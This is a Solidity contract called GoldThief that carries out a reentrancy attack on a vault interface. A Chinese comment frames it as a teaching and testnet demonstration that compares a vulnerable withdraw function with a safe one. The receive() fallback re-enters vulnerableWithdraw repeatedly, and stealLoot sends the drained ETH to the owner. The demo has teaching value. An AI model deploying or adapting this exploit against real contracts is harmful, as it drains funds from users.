// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IVault {
    function deposit() external payable;
    function vulnerableWithdraw() external;
    function safeWithdraw() external;
}

contract GoldThief {
    /// @dev 教学/测试网友好：低于 1 ETH 亦可演示重入；须与前端校验一致
    uint256 public constant MIN_ATTACK_WEI = 0.01 ether;

    IVault public targetVault;
    address public owner;
    uint256 public attackCount;
    bool public attackingSafe;

    constructor(address _vaultAddress) {
        targetVault = IVault(_vaultAddress);
        owner = msg.sender;
    }

    function attackVulnerable() external payable {
        require(msg.sender == owner, "Only owner");
        require(msg.value >= MIN_ATTACK_WEI, "Below min attack value");

        attackingSafe = false;
        attackCount = 0;

        targetVault.deposit{value: msg.value}();
        targetVault.vulnerableWithdraw();
    }

    function attackSafe() external payable {
        require(msg.sender == owner, "Only owner");
        require(msg.value >= MIN_ATTACK_WEI, "Below min attack value");

        attackingSafe = true;
        attackCount = 0;

        targetVault.deposit{value: msg.value}();
        targetVault.safeWithdraw();
    }

    receive() external payable {
        attackCount++;

        if (
            !attackingSafe &&
            address(targetVault).balance >= MIN_ATTACK_WEI &&
            attackCount < 5
        ) {
            targetVault.vulnerableWithdraw();
        }

        if (attackingSafe) {
            targetVault.safeWithdraw();
        }
    }

    function stealLoot() external {
        require(msg.sender == owner, "Only owner");
        uint256 bal = address(this).balance;
        require(bal > 0, "Nothing to steal");
        (bool sent, ) = payable(owner).call{value: bal}("");
        require(sent, "ETH transfer failed");
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
